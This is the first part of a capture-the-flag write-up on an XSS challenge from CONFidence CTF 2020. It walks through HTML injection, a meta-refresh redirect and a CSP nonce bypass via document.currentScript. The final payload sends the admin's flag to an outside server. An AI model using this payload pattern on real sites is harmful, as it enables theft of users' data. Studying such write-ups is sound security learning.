<h2>Yet Another Yet Another Cat Challenge Part 1/2</h2>

<h3>Description</h3>

<blockquote>Yet Another Cat Challenge for you! Just another boring add/remove/share note app, but with 8 different cats!

http://yayacc.zajebistyc.tf</blockquote>



<p>One day when I was chatting with my friend <a href="https://gynvael.coldwind.pl/">Gynvael</a>, he told me about one hard XSS challenge from CONFidence CTF 2020 that he faced. So I decided to give it a try and see what is going on, two hints that he gave me were :</p>
<ol>
 <li>HTML injection</li> <li>Theme selection where XSS will happen.(Tho there is intended and unintended solution, we will cover intended in part 2)</li></ol><br>
<p>So in this challenge after we login, we get to the page where we can add "note". On view page source we can see this:</p>

![addnote](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/entrypage.png)

```javascript
<html>
<head>
    <title>Yet Another Cat Challenge</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
          integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script src="/flag?var=flag" nonce="0vOlzlwTCvS5btb6IkPB1Q"></script>
    <script src="https://www.google.com/recaptcha/api.js?render=6Le09cUZAAAAAN4r7Ushpf0tdpAowD0LNE1gNsHI"></script>
    <script nonce="0vOlzlwTCvS5btb6IkPB1Q">
        window.onload = function()
        {
            document.getElementById('hello').innerText += ' ' + flag;
        }
        grecaptcha.ready(function() {
            grecaptcha.execute('6Le09cUZAAAAAN4r7Ushpf0tdpAowD0LNE1gNsHI', {action:'validate_captcha'})
                  .then(function(token) {
            // add token value to form
            captchas = document.getElementsByName('g-recaptcha-response')
            for(var i = 0; i < captchas.length; i++)
                captchas[i].value = token;
        });
    });
    
    </script>
</head>
<body>
<div id="hello">
    Hello pkellerman, the flag is:
</div>
<ul class="list-group">
    
</ul>
<a href="/note" class="btn btn-primary">Add note</a>
</body>
</html>
```

<p>We can see there is script tag with src to <code>/flag?var=flag</code> and if we go to that path we won't get the flag obviously because we are not an admin.<br>So when we want to Add Note, we have a form with content and Cat options to choose. The page source looks like this : </p>

```javascript
<html>
    <head>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script nonce="_uqFLtygAarWEsN-Lmv16g">
    document.scripts[0].remove()
    blackTheme = 'background-color: #000000; color: #ffffff';
    whiteTheme = 'background-color: #eeeeee; color: #111111';    

    // stolen from http://www.yaldex.com/FSBackground/BouncingImage.htm
    var img;
    var step = 5;
    var delay = 30;
    var height = 0;
    var Hoffset = 0;
    var Woffset = 0;
    var yon = 0;
    var xon = 0;
    var pause = true;
    var interval;
    var xPos = 20;
    var yPos = window.innerHeight;
    function changePos() {
    height = window.innerHeight;
    width = window.innerWidth;
    Hoffset =33;
    Woffset =30;
    img.style.top = yPos + window.pageYOffset;
    img.style.left = xPos + window.pageXOffset;
    if (yon) {
    yPos = yPos + step;
    }
    else {
    yPos = yPos - step;
    }
    if (yPos < 0) {
    yon = 1;
    yPos = 0;
    }
    if (yPos >= (height - Hoffset)) {
    yon = 0;
    yPos = (height - Hoffset);
    }
    if (xon) {
    xPos = xPos + step;
    }
    else {
    xPos = xPos - step;
    }
    if (xPos < 0) {
    xon = 1;
    xPos = 0;
    }
    if (xPos >= (width - Woffset)) {
    xon = 0;
    xPos = (width - Woffset);
       }
    }
    function start() {
    img = document.createElement('img');
    img.src = '/static/cats/lusia.png';
    img.style = 'position: absolute; width: 200px';
    document.body.appendChild(img);
    interval = setInterval(changePos,delay);
    document.body.style = whiteTheme;
    }
    window.onload = start;
    </script>
    </head>
    <body>
        <div class="container">
            <div>test</div>
            <div><a href="/delete/a154be63-5b7f-444c-940f-92c76037fabd" class="btn btn-primary">Delete</a></div>
            <div>
                Theme:
            <a href="?theme=whiteTheme">white</a> <a href="?theme=blackTheme">black</a>
            </div>
            <div><a href="/">back</a></div>
        </div>
    </body>
</html>
```

With response headers : 

```javascript
Connection: keep-alive
Content-Encoding: gzip
Content-Security-Policy: default-src 'none'; form-action 'self'; frame-ancestors 'none'; style-src https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css; img-src 'self'; script-src 'nonce-VWn7r5GTbTcLZSqYM4JutQ' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/
content-security-policy: noscript-marker;font-src http:;media-src http:;object-src http:
Content-Type: text/html; charset=utf-8
Date: Wed, 16 Sep 2020 17:40:08 GMT
Server: nginx/1.19.1
Transfer-Encoding: chunked
Vary: Accept-Encoding
Vary: Cookie
X-DNS-Prefetch-Control: off
```

<p>From all of this we can see few things, there is CSP rule with img-src to 'self' which is only going to allow same domain image, and script-src with unique nonce which is going to execute the script only with that nonce value (nonce value is different for every note). Selected cat is being added inside of that <code>start()</code> function as img.src, content is being added to container div and we do have option to change from White to Black theme color. We can either delete the current note or go back and share it with an admin.</p>

<h3>Solution (Uninteded)</h3>

<p>First step is HTML injection which we can achieve by changing the <code>select</code> tag to either input or textbox for cat selection. <b>Note that both solution intended and uninteded will require those steps.</b><br>Inputing punctuation type of payload we can see that some chars are not being escaped.

```javascript
img.src = '!"#$%&\&apos;()*+,-./:;<=>?@[\\]^_`{|}~';
```
There are certain punctuation signs that are not being escaped which is going to be important, those are : slashes, single quotes, backticks, less than and greater than sign... <br>
And that is all fine... but there are some crucial questions to be asked. Since we know that <b><code>/flag?var=flag</code></b> is only accessible or rather to say only admin can see the flag, we will need to make a Note with XSS and share it to the admin and retrieve the flag that is on that endpoint. The questions are : </p>
<ol>
<li><b>How are we going to bypass CSP?</b></li>
<li><b>How are we going to perform that XSS through theme selection?</b></li>	
</ol>
<br>
<h4>Bypass CSP</h4>

<p>We know that CSP isn't going to allow ajax requests (default-src 'self' - fallback) to different domains, so how are we going to find an answer to question 1. or to be more precise how to make a request without javascript and ajax? This one was pretty hard to think of, after talking to Gynvael and some research there comes one thing <code><b>http-equiv="refresh" content="0; URL=..."</b></code> . Pretty interesting that I've forgot about this <b>meta tag</b> attribute, it is actually refreshing page and can do a redirect which is going to be exactly what we need.<br>Since he gave me a hint that XSS will be at selecting theme, fastly testing it out :</p>

![theme_xss_example](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/theme_xss_example.png)

<p>It does execute an alert as we see. Now really hard comes up, basically connecting two steps together. We need to redirect admin to the note where our XSS will be, grabbing the flag and sending it to our server.</p>

<h4>Making of payload</h4>

<p>I've created a test "note" and did HTML injection that I was talking about above. First we can escape of script tag where our javascript lives by closing script tag on start , that will successfully bypass single quotes that is not being escaped. With that we are escaping the javascript and we can followup with meta tag (Step 1 payload example). For example : </p>

```javascript
</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/flag?var=flag">
```
<p>Testing this did successfully redirected us to the flag query path which is a good thing.<br>Connecting to Step 2 now, we have to craft an actual XSS script that we will inject in our theme  and share that note with an admin, which will make request to our server where we will store the request and flag with it. We know that script will be in <code>document.body.style</code> because that is where the theme is being set inside that start function (and from our alert example). So creating a new script and appending it to the DOM should be easy, right? <br> Well yea... but not really there is a hard part, we have to bypass the CSP with that <code>script nonce</code> which is only going to execute the script with that unique value that script is holding. Though if you scroll up on the start of the script tag you will see that on the next line is this : <code>document.scripts[0].remove()</code>.<br>I did think it's going be straight forward from here, but it won't because of that line there... Gynvael gave me a hint with question is the script really being removed or is there way to keep reference... and yea there was.<br>The answer to this is <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/currentScript">document.currentScript<a><br>
</p>
<p>If you read the docs: </p>

<blockquote>

```javascript
The Document.currentScript property returns the script element whose script is currently being processed and isn't a JavaScript module. (For modules use import.meta instead.)
It's important to note that this will not reference the script element if the code in the script is being called as a callback or event handler; it will only reference the element while it's initially being processed.

```

</blockquote>

<p>And that is exactly what we need, we only care about the script tag nonce attribute while it's being executed, we will grab that tag and add it to our newly injected script with src <code>/flag?var=flag</code> so that way we will have flag as a global variable and the we just have to pass that variable to our server. And this is achievable with <code>document.location</code> which is going to make a GET request to our server and the flag will be sent as query string.<br> </p>
<br>
<p>Now I just created a new note added some random content , did HTML injection and inserted this payload from below. Meta tag url is linking to previous note that I've made.</p>

<p>Our final payload should look like this : </p>

```javascript
</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/note/48ab77af-f06d-48d5-a6d2-fba6ddcc8227?theme=`color:red`;}var oldsc=document.currentScript.nonce;var sc =document.createElement(`script`);sc.nonce=oldsc;sc.src=`/flag?var=flag`;document.querySelector(`html`).appendChild(sc);setTimeout(function(){document.location=`https://ctf.warriordev.com/ctfserver/ref?flag=${flag}`},100);{//

```

<b> FLAG : </b>

![flag](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/flag.png)

<h4>Diagram</h4>
<p>This is just my random drawing to visualize what is going on.</p>

<img src="https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/diagram.png" width="1100px" height="700px">

<h4>Summary part 1</h4>
<p>This challenge was very hard and made in pretty realistic scenario props to folks from <a href="https://p4.team/">p4</a>. I hope part 1 of this writeup will help someone to understand some of complexity of XSS attacks.  </p>

<h3>To be continued...</h3>